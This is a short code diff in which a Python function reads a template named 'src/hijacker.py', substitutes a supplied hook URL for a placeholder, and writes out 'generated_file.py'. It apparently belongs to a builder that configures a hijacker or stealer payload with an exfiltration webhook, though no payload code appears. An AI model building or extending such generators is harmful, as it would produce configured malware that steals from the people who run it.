@@ -5,7 +5,7 @@ def create_python_file(hook):
     with open('src/hijacker.py', 'r', encoding='utf-8') as f1:
         content = f1.read()
 
-    updated_content = content.replace("{{HOOK}}", hook)
+    updated_content = content.replace("hook_url", hook)
 
     with open('generated_file.py', 'w', encoding='utf-8') as f2:
         f2.write(updated_content)
